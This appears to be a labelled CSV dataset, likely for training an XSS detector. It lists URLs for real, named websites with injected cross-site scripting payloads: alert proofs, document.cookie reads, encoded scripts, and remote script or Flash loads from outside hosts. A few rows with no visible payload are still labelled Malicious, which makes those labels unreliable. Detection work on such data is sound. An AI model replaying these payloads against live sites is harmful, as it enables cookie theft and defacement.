Sentence,Type
http://www.gentag.fr/code-barres/advanced_search_result.php?kw=/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;&amp;search_in_description=1&amp;x=13&amp;y=16,Malicious
http://arunosan.free.fr/arunosan_v2/perso/journal/info.php?j=110407/&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious
http://www.polycontrols.com/info.php?content=contact&amp;lang=fr-ca/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;,Malicious
http://ipko.net/ipko_portal/site/bin/comments_arte.php?newsid=1%22%3e%3cscript%3ealert%281%29%3c/scr<br>ipt%3e%3c!--,Malicious
http://www.upsa-vs.ch/pdf/extension%20avenant%202011.pdf%3c/cite%3e%3cspanclass=%3e%3cscript%3ealert<br>%28%22xssed / 3spi0n%22%29%3c/script%3e,Malicious
https://publications.univ-st-etienne.fr/category.php?id_collection=35/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;,Malicious
http://www.lamaisondesenseignants.com/index.php?action=afficher&amp;rub=5&amp;id=3139/&quot;&gt;&lt;script&gt;alert(1)&lt;/sc<br>ript&gt;,Malicious
http://www.moracchini-echecs-institut.com/info.php?contentid=46&amp;level=52/&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious
http://www.lds.org/portal/site/ldsorg/menuitem.062a5ea6a5e8d8661b622015f1e543a0/?vgnextoid=84010fd41<br>d93b010vgnvcm1000004d82620arcrd&amp;locale=0&amp;hidenav=1&amp;pagenumber=1&amp;maxresults=20&amp;narrow_by=&amp;query=%22%3<br>e%3cscript%3ealert%281%29%3c%2fscript%3e++&amp;bucket=allchurchcontent&amp;datefrom=&amp;dateto=&amp;author_category<br>=&amp;author_name=&amp;format=&amp;submitsearch=search&amp;datefromdisplay=&amp;datetodisplay=&amp;findbyauthor=,Malicious
http://www.emp.lt/?mact=search%2ccntnt33%2cdosearch%2c0&amp;cntnt33returnid=15&amp;cntnt33searchinput=%3cscr<br>ipt%3ealert%28document.cookie%29%3c%2fscript%3e&amp;cntnt33submit.x=0&amp;cntnt33submit.y=0,Malicious
https://www.pildyk.lt/paieska/?query=%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e,Malicious
http://computex.ws/index.asp?searchtext=%3cscript%3ealert%28%27e1+wuz+here%27%29%3c%2fscript%3e&amp;lt=s<br>earch,Malicious
"http://newsroom.lds.org/ldsnewsroom/eng/search?&amp;query=%27%22%20%3c/script%3e%20%3cscript%3eeval(stri<br>ng.fromcharcode(97,108,101,114,116,40,39,88,83,83,32,98,121,32,98,104,111,39,41,59,32,100,111,99,117<br>,109,101,110,116,46,98,111,100,121,46,105,110,110,101,114,72,84,77,76,61,39,88,83,83,32,98,121,32,98<br>,104,111,39,59))%3c/script%3e",Malicious
http://www.iddaa.com//iddaacom/haberall/default.asp?hdnpage=1&amp;id=eu&amp;takim=%3e%22%3e%3cscript%20%0a%0<br>d%3ealert(document.cookie)%3b%3c/script%3e,Malicious
http://riaa.com/goldandplatinumdata.php?resultpage=2&amp;table=tbltopart&amp;action=%22%3e%3cscript%20langua<br>ge=%22javascript%22%3e%20alert%20(%22http://inf0rm47i0n.net/%20w4z%20h3r3%22)%20%3c/script%3e,Malicious
http://www.aaa.com/scripts/webobjects.dll/zipcode.woa/250/wa/route?wosid='%3e%22%3e'%3e%3cscript%3ea<br>lert(%22xss%20by%20kusomiso.com%22)%3c/script%3e,Malicious
http://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.com/home.php?l=en&amp;token=v1hokoclcs0kewj<br>a9n7gzcqoahuyw4ekhb4uhcuyayaamirwoam4dq&amp;q=%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%2f%2fkusomiso.com%2f<br>x.js%3e%3c%2fscript%3e,Malicious
http://www.ohozaa.com/hotweb/?from=90&amp;cid=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3e%3<br>cmarquee%3e%3ch1%3emeloulisi%3c/h1%3e%3c/marquee%3e,Malicious
http://www.albnaa.com/vbzoom/index.php?userid=&quot;;&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious
http://www.zuzaa.com/topsite/rankem.asp?id=&quot;&gt;&lt;script&gt;alert('trex')&lt;/script&gt;,Malicious
http://www.theaa.com/travel/basicsearch/preparepoisearchstage2.do?statusstage2=new&amp;page=fooddrink,Malicious
http://support.jgaa.com/?cmd=showarticle&amp;id=31}%3c/style%3e%3cscript%3ea=eval;b=alert;a(b(/xss/.sour<br>ce));%3c/script%3e,Malicious
http://www.iddaa.com/iddaacom/haberall/default.asp?id=t2b%22%3e%3cscript%3ealert(%22daimon%22)%3c/sc<br>ript%3e,Malicious
http://www.kouaa.com/search.php?keyword=%3cscript%3ealert(123)%3c%2fscript%3e+&amp;opt=0&amp;cherche.x=0&amp;che<br>rche.y=0,Malicious
http://www.team-aaa.com/root/profile.php?enter_id=%22'e/%3e%3cscript%3ealert(1)%3c/script%3e,Malicious
http://www.tazehaa.com/search/frame.php?url=http://www.xssed.com,Malicious
http://www.aa.com/aa/contactaa/viewcontactaaaccess.do?selectedfilename='); alert(1); //,Malicious
https://www.aa.com/login/loginaccess.do?anchorevent=false&amp;previouspage=/homepage.do&amp;uri='%22%3e%3cbo<br>dy%20onload=%22alert(1)%22%3e&amp;previouspage=/homepage.do&amp;anchorevent=false&amp;uri=/login/loginaccess.do&amp;<br>v_locale=en_us&amp;v_mobileuaflag=aa,Malicious
http://www.aa.com/aa/i18nforward.do?locale=es_us&amp;searchstring=%20&amp;p=/utility/sitemap/sitemap.jsp&amp;p=/<br>utility/sitemap/sitemap.jsp&amp;togglesubmitbutton=%22&gt;&lt;iframe%20src%3d%22http://google.com,Malicious
http://audi.co.il/print_map.asp?img=%22%3e%3cscript%3ealert%28%22xssed%20by%20jester%20:%29%22%29%3c<br>/script%3e,Malicious
http://www.qkschool.org.uk/about/contact/email/other/admissions/http://www.qkschool.org.uk/about/con<br>tact/email/other/admissions/%22onmouseover=prompt%281337%29%3e,Malicious
http://vankasteren-ict.nl/view_news.php?id=%27%22%28%29%26%251%3cscript%20%3eprompt%28960682%29%3c%2<br>fscript%3e,Malicious
http://www.hrf.tu.nato.int/isaf/public/search.php?search=%22%3e%3cscript%3ealert(document.cookie)%3c<br>/script%3e,Malicious
http://www.mob98.ir/fastsearch?btnsubmit=&amp;query=%3cscript%3ealert%28%27amirmagic%27%29%3c/script%3e,Malicious
http://www.dailymotion.com/upload?error_msg=error:&lt;script&gt;alert(&quot;dun%20dun%20dun%20duuun&quot;)&lt;/script&gt;,Malicious
http://www.hbeu1.hsbc.com/ukservices/branchlocator/town.asp?town=679&amp;type=&quot;&gt;&lt;script&gt;alert(&quot;daimon&quot;)&lt;<br>/script&gt;,Malicious
http://www.dailymotion.com/login?restricted_action=&quot;&gt;&lt;script&gt;alert('trex')&lt;/script&gt;,Malicious
http://www.dailymotion.com/relevance/search/%2522%253b%253c%252fscript%253e%253cscript%2bsrc%253dhtt<br>p%253a%252f%252fquangntenemy.t35.com%252flolxss.js%253e%253c%252fscript%253e,Malicious
http://winelibrary.com/search.asp?search=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://www.dailymotion.com/upload?upload_id=%27%22%3e%3cfont%20color=%22red%22%3e%3cmarquee%3e%3ch1%<br>3exssed%20by%20xylitol&amp;sid=67bf4c2560e12b93c01a323be1376d8e&amp;urlbase=%27%22%3e%3cmarquee%3e%3ch1%3eol<br>ol%20wtf%20dude%20????????????!&amp;flash_mode=1,Malicious
http://kids.dailymotion.com/pageitem/video/player?dispatch=1&amp;request=%2fvideo%2fx7pm1h&amp;masscastlocat<br>ion=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xyli<br>tol%3c/h1%3e%3c/marquee%3e%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%<br>3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e&amp;playlist_id=%27%22%3e%3c/title%3e%3cscript%3ealert(<br>1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://ads.mail.com/www/delivery/ck.php?oaparams=2__bannerid=233__zoneid=0__cb=0a7dd684de__maxdest=h<br>ttp://www.trlink.net,Malicious
http://learn.doubleclick.com/login.asp?sessionid=%22%3e%3cscript%3ealert(/trlink.net/)%3c/script%3e,Malicious
http://banque.hsbc.fr/contact/contact_ent_inter.php?dest=%22%3e%3cscript%3ealert(/www.trlink.net%20h<br>sbc%20france%20easy%20security/)%3c/script%3e,Malicious
http://www.vh1e.com/search.htm?qt=%27%3e%3cscript%3ealert%28%27c4prica+was+here+-+cyber-attack.org%2<br>7%29%3b%3c%2fscript%3e&amp;lang=en&amp;ok.x=0&amp;ok.y=0&amp;ok=search,Malicious
http://rouqia.com/index.php?var=medecine-prophete_hijama&amp;lg=fr/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;,Malicious
http://www.confiserieboisson.com/controller/main.php?id=accueil/&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious
http://www.umoncton.ca/google/?cx=015502390780218832549%3au-li9q5eugg&amp;cof=forid%3a11&amp;q=/&quot;&gt;&lt;script&gt;al<br>ert('xss by atm0n3r')&lt;/script&gt;&amp;op.x=34&amp;op.y=5&amp;form_id=google_cse_results_searchbox_form,Malicious
http://www.floraselect.co.uk/start.php/index.php?page=shop&amp;action=viewproduct&amp;pid=3756/&quot;&gt;&lt;script&gt;ale<br>rt(1)&lt;/script&gt;,Malicious
http://laogolfana.com/start.php?index=8/&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious
http://www.endoscoop.net/index.php/&quot;&gt;&lt;script&gt;alert('xss by atm0n3r')&lt;/script&gt;,Malicious
http://openx.kanobu.ru/www/delivery/ck.php?oaparams=2__bannerid=742__zoneid=8__cb=77202f4dba__oadest<br>=http://st2tea.blogspot.com,Malicious
http://www.jeux-html5.net/games.php?id=233/&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious
http://www.tissy.fr/games.php?id=159/&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious
http://www.jfkl.org.my/search.php?words=&lt;script&gt;a=eval;b=alert;a(b(/alert!!!!/.source));&lt;/script&gt;'&quot;&gt;<br>&lt;marquee&gt;bug xss detected&lt;/h1&gt;&lt;/marquee&gt;&lt;script&gt;a=eval;b=alert;a(b(/bug xss detected by<br>vir0e5/.source));&lt;/script&gt;,Malicious
http://www.pusdikif.mil.id/pusdikif/index.php?p=galeri&amp;gall=1&amp;gal_cat=%3cscript%3ealert%280%29%3c/sc<br>ript%3e,Malicious
http://www.feedage.com/feeds.php?t=%22%3e%3cscript%3ealert(%27xss%27)%3c/script%3e&amp;sb=4&amp;submit=searc<br>h,Malicious
http://www.icnl.org/knowledge/library/searchresults.php?txtsearch=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;%<br>2fscript&gt;&amp;cmdsearch=search,Malicious
http://www.ohloh.net/people?query=%3cscript%3ealert(%27xss%27)%3b%3c%2fscript%3e,Malicious
http://gatesofandaron.com/?kid=1-23345-03845-1003-120281fc%27%22%3e%3cscript%3ealert%28document.cook<br>ie%29%3c%2fscript%3e,Malicious
http://battleknight.us/?kid=1-01945-03845-1003-1202817f%27%22%3e%3cscript%3ealert%28document.cookie%<br>29%3c%2fscript%3e,Malicious
http://www.fmgl.com.au/irm/showcategory.aspx?categoryid=177&amp;hidetopline=true%27%22%3e%3ciframe%20src<br>=http://www.xssed.com%3e&amp;shareprice=hide&amp;archivelink=true,Malicious
http://www.fan-de-cinema.com/cherche.html?cx=partner-pub-4314136825183072:b3c4nx-t02p&amp;cof=forid:11&amp;i<br>e=iso-8859-1&amp;q=%22%3e%27%3e%3cimg+src=a+onerror=alert%28document.cookie%29+/%3e,Malicious
http://www.chocolate.com/search/?query_string=%22%3e%3cscript%3ealert%2842%29%3c%2fscript%3e,Malicious
http://www.hpcalc.org/search.php?query=%22%3e%27%3e%3cscript%3ealert%2842%29%3b%3c%2fscript%3e,Malicious
http://www.consilium.europa.eu/cms3_applications/applications/newsroom/galleryviewer.asp?command=bro<br>wse&amp;lang=%22%3e%3ciframe%20src=http://google.com%3e%3c/iframe%3e%3cscript%3ealert(document.cookie);%<br>3c/script%3e&amp;cmsid=818,Malicious
http://eunis.eea.europa.eu/sites-factsheet.jsp?tab=1&amp;idsite=a00010083%3cscript%3ealert('agd_scorp')%<br>3c/script%3e,Malicious
http://www.cpvo.europa.eu/default.php?res=1&amp;w=864&amp;h=510&amp;lang=en&amp;page=etxtusername=%27%22%3e%3c%2ftit<br>le%3e%3cscript%3ealert%281337%29%3c%2fscript%3e%3e%3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%<br>2fmarquee%3e&amp;txtpassword=ssssssss&amp;txtmode=dologin&amp;login=loginmploi/annonces.html,Malicious
http://search.eurofound.europa.eu/search?q=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert%281337%29%3c%2fs<br>cript%3e%3e%3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2fmarquee%3e&amp;site=default_collection&amp;bt<br>ng=search&amp;ie=&amp;output=xml_no_dtd&amp;client=default_frontend&amp;lr=&amp;proxystylesheet=default_frontend&amp;oe=utf-<br>8&amp;getfields=dc%252edate%252emodified&amp;curent_date=2008-06-08,Malicious
http://www.emcdda.europa.eu/www/advancedsearch.cfm?ssearchtext=%3cscript%3ealert('xssed by<br>roach189')%3c/script%3e,Malicious
http://eur-lex.europa.eu/joindex.do?ihmlang=%22%3e%3cscript%3ealert(123)%3c/script%3e,Malicious
http://eur-lex.europa.eu/smartapi/cgi/sga_doc?smartapi!celexapi!prod!celexnumdoc&amp;lg=en&amp;numdoc=21994a<br>0103(01)&amp;model=guichett&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;'&quot;&gt;&lt;marquee&gt;&lt;h1&gt;mystick&lt;/h1&gt;&lt;/marque<br>e&gt;,Malicious
http://stats04.emcdda.europa.eu/%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%27%22%3e%3<br>cmarquee%3e%3ch1%3exxxxxxxxx%3c/h1%3e%3c/marquee%3e,Malicious
http://profiles.emcdda.europa.eu/%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%27%22%3e%<br>3cmarquee%3e%3ch1%3exxxxxxxxx%3c/h1%3e%3c/marquee%3e,Malicious
http://video.consilium.europa.eu/index.php?pl=1&lt;/script&gt;&lt;iframe%20src=&quot;http://xssed.com&quot;&gt;&amp;sessionno=<br>0,Malicious
http://www.ema.europa.eu/ema/index.jsp?curl=pages/includes/medicines/medicines_landing_page.jsp&amp;quic<br>ksearch=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.eu-un.europa.eu/home/search.asp?showform=no&amp;query=&amp;lg=%3e%22%3cscript%3ealert(document.co<br>okie)%3c/script%3e,Malicious
http://www.airliners.net/search/photo.search?codesearch=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://sportsillustrated.cnn.com/?cid=&quot;&gt;&lt;script&gt;alert(/www.r3t.n3t.nl/)&lt;/script&gt;,Malicious
http://vault.sportsillustrated.cnn.com/vault/result/article/index.htm?query=%3ciframe%20src=%22javas<br>cript:alert(%27xss%20by%20\nxylitol%27);%22%3e%3c/iframe%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3<br>c/h1%3e%3c/marquee%3e&amp;searchtype=mag_article&amp;exactclause=&amp;notclause=&amp;orclause=&amp;startdt=&amp;enddt=&amp;shoot<br>id=&amp;sortby=date&amp;currentpage=1&amp;npp=10,Malicious
http://siwiki.sportsillustrated.cnn.com/index.php?title=special:vaultredirect&amp;redirect=&lt;script&gt;alert<br>('[-] xss found!!! ::: author : cracker ::: milw0rm.com/author/1303')&lt;/script&gt;,Malicious
http://firept-up.servegame.com:8090/painel/existe.php?id=http://firept-up.servegame.com:8090/painel/<br>existe.php?id=%3cscript%3ealert%28%22xssed%20by:%20d4rkweaver%22%29%3c/script%3e%3cembed%20src=%22ht<br>tp://casa-alves.com/xss.swf%22%20width=%220%22%20height=%220%22%3e%20%3ccenter%3e%3cimg%20src=%22htt<br>p://mob615.photobucket.com/albums/tt237/joaosilas/linux-logo1.jpg%22%3e%3c/center%3e%3ciframe%20src=<br>%22http://casa-alves.com/xss.html%22%20width=%221248%22%20height=%22450%22%3e,Malicious
http://info.kopp-verlag.de/suche.html;msg=&lt;script&gt;alert(&quot;xssbydt&quot;)&lt;/script&gt;,Malicious
http://search.ulsankyocharo.com/search.php?kwd=%u003cembed%u0020src%u003d%u0022http%u003a//pds20.egl<br>oos.com/pds/201009/28/75/1111.swf%u0022%u003e%u003cscript%u003ealert%u0028%u0022%u003a-%u0029%u0022%<br>u0029%u003c/script%u003e,Malicious
http://www.endallforeclosures.com/idx/index.php?main=searchresults&amp;id_from=yti4hq138i6k7rxn4b18x439w<br>s6hg7fz5j5du4ji,Malicious
http://www.the-west.cz/?ref=&quot;&gt;&lt;script&gt;alert(&quot;0x3a&quot;);&lt;/script&gt;,Malicious
http://www.dersrehberi.com/ozel-ogretmen.asp?ders=%22%3e%3cscript%3ealert%28%22k4ndemir%22%29;%3c/sc<br>ript%3e,Malicious
http://www.careerjet.co.in/search/jobs?s=%3cscript%3ealert%28%22xssed+by+snypter%22%29%3c%2fscript%3<br>e&amp;l=india,Malicious
http://www.dmv.com/auto-insurance-quotes?zip=12345%22;alert%281%29;%20//&amp;ni_ad_client=167457&amp;go.x=0&amp;<br>go.y=0&amp;form_build_id=form-bde523fcc07513e4340e56b6a286259b&amp;form_id=dmv_core_zipform,Malicious
"http://blekko.com/tag/profile?m=1&amp;email=editpro%2540bk.ru&amp;name=&amp;desc=&amp;website=%3cscript%3ealert%28do<br>cument.cookie%29%3c/script%3e%3cimg%20src=%20http://www.tnr.com/sites/default/files/imagecache/thumb<br>nail_landing/romaniaflag.jpg%20align=center%3e%3cmarquee%20scrollamount=%223%22%3esystem%20error..we<br>ll,%20joke,%20it%27s%20only%20xss..we%20can%20see%20cross%20site%20scripting%20on%20the%20blekko%20-<br>%20web%20search%20engine.%20by%20sony.%20http://st2tea.blogspot.com%3c/marquee%3e",Malicious
http://www.syrianwebsites.com/index.php?cat=&quot;&gt;&lt;script&gt;alert(123);&lt;/script&gt;,Malicious
http://www.inonu.edu.tr/bilgi/harf.php?harf=l=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;marquee&gt;thr0<br>ad&lt;/marquee&gt;,Malicious
http://www.mysql.ru/search/?terms=&lt;script&gt;alert(61)&lt;/script&gt;e&amp;sort=matches&amp;display=25&amp;b=1,Malicious
http://yahoo.rogers.com/yahoo/spotlight/tv_stevie.jsp?id=2008/03/20080303&quot;&gt;&lt;script&gt;alert(document.co<br>okie)&lt;/script&gt;'&quot;&gt;&lt;marquee&gt;&lt;h1&gt;&quot;&gt;&lt;script&gt;alert(&quot;methodman&quot;)&lt;/script&gt;&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.technewsworld.com/perl/search.pl?&amp;query=f-secure&amp;init=60&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;<br>/script&gt;,Malicious
"http://tvlistings.telegraph.co.uk/grid.php?&amp;day=&quot;&gt;&lt;script&gt;alert(string.fromcharcode(88,83,83))&lt;/scri<br>pt&gt;",Malicious
http://bedbathandbeyondmastercard.com/index.cfm?section=home&amp;ics_src=&quot;&gt;&lt;script&gt;alert(12157312.477)&lt;/<br>script&gt;,Malicious
http://radhealth.usuhs.mil/medpix/medpix_cow.html?pt_id=&quot;&gt;&lt;script&gt;alert(12157312.477)&lt;/script&gt;,Malicious
http://www.norman.com/site_search/en?searchstring%3autf8%3austring=&quot;&gt;&lt;iframe src=index.htm,Malicious
"http://www.norman.com/support/support_issue_archive/67744/en?msg:utf8:ustring=%22%3e%3cscript%3ealer<br>t(string.fromcharcode(88,83,83))%3c/script%3e",Malicious
http://bankofamerica.reo.com/search/propertysearchresults.asp?stateid=&amp;county=&amp;city=&amp;pricelow=0&amp;pric<br>ehigh=100000000&amp;bedrooms=0&amp;bathrooms=0&amp;propertytypeid=&amp;zipcode=&quot;'/&gt;&lt;script&gt;alert(document.cookie)&lt;/s<br>cript&gt;,Malicious
"http://www.nytstore.com/emailconfirm.aspx?email=&quot;'/&gt;&lt;script&gt;alert(string.fromcharcode(88,83,83))&lt;/sc<br>ript&gt;",Malicious
"https://www.paypoint.net/partners/pay-per-signup/?&quot;&gt;&lt;script&gt;alert(string.fromcharcode(88,83,83))&lt;/sc<br>ript&gt;",Malicious
"http://upgrade.kaspersky.nl/step2.php?lang=&quot;&gt;&lt;script&gt;alert(string.fromcharcode(88,83,83))&lt;/script&gt;",Malicious
"http://w1000.mv.us.adobe.com/events/main.jsp?productid=&amp;solutionid=20&amp;month=05&quot;&gt;&lt;script&gt;alert(string<br>.fromcharcode(88,83,83))&lt;/script&gt;",Malicious
"http://wwwstuff.wip3.adobe.com/events/main.jsp?productid=124&amp;solutionid=&amp;month=}&quot;&gt;&lt;script&gt;alert(stri<br>ng.fromcharcode(88,83,83))&lt;/script&gt;",Malicious
"http://feeds.adobe.com/index.cfm?query=bylanguage&amp;languageid=16&amp;languagename=indonesian}&quot;&gt;&lt;script&gt;al<br>ert(string.fromcharcode(88,83,83))&lt;/script&gt;",Malicious
"http://twittercounter.com/trendmicro?predicted=&quot;&gt;&lt;script&gt;alert(string.fromcharcode(88,83,83))&lt;/scrip<br>t&gt;",Malicious
"http://blog.truste.org/index.php?s=&quot;&gt;&lt;script&gt;alert(string.fromcharcode(88,83,83))&lt;/script&gt;",Malicious
"http://blog.trust-guard.com/?s=&quot;&gt;&lt;script&gt;alert(string.fromcharcode(88,83,83))&lt;/script&gt;",Malicious
http://vizlab.nytimes.com/datasets?q=%22%3e%3ciframe%20src=index.htm,Malicious
https://support.easycorp.co.uk/index.php?action=announcements&amp;query=&quot;&gt;&lt;script&gt;alert(12157312.477)&lt;/s<br>cript&gt;,Malicious
http://laboutique.airfrance.fr/produitliste.php?id_recherche=7%27%22%3e%3c/title%3e%3cscript%3ealert<br>(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://eshopping.airfrance.fr/actions/changerlangue?language=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious
http://www.americasarmy.com/includes/bumper.php?goto=%3cscript%3ealert('xss%20by%20r080cy90r')%3c/sc<br>ript%3e,Malicious
http://www.americasarmy.com/realheroes/index.php?id=&quot;&gt;&lt;script&gt;alert('hacked%20by%20turkpower')&lt;/scri<br>pt&gt;&lt;h1&gt;defaced%20by%20turkpower&lt;/h1&gt;='%22%3e%3ciframe%20src=http://xssed.com%3e,Malicious
http://www.hellojack.com/jacknews/?result=&lt;script&gt;alert(1);&lt;/script&gt;,Malicious
http://big5.fmprc.gov.cn/gate/big5/mail.amb-chine.fr/badlogin.php?tid=0&amp;lid=&quot;&gt;&lt;script&gt;alert(document<br>.cookie)&lt;/script&gt;&lt;p+,Malicious
http://www.bangyourbrain.com/index.php?op=show&amp;id=995&amp;mr=%22%3e%3cscript%3ealert(1337)%3c/script%3e,Malicious
http://www.previdenciasocial.gov.br/conteudodinamico.php?id=%22%3e%3cscript%3ealert(/illuz1on@r00tde<br>faced.net/)%3c/script%3e,Malicious
http://www.avo.alaska.edu/image.php?id=17030%22%3e%3cscript%3ealert(/illuz1on/)%3c/script%3e,Malicious
http://www.fcpr.ro/clasamente.php?tip=1&amp;idj=11&amp;idconc=%22%3e%3cscript%3ealert(document.cookie)%3c/sc<br>ript%3e,Malicious
http://onefm.ro/dj-profile.php?id=%22%3e%3cscript%3ealert(/illuz1on-at-r00tdefaced.net/)%3c/script%3<br>e,Malicious
http://www.mcdonalds.com/usa/usa_searchresults.html?querytext=&quot;&gt;&lt;script&gt;alert(&quot;xss found by<br>rugburn&quot;)&lt;/script&gt;,Malicious
http://www.hilton.com/en/hi/groups/index.jhtml?eventtype=&quot;&gt;&lt;script&gt;alert(&quot;rugburn was<br>here&quot;)&lt;/script&gt;,Malicious
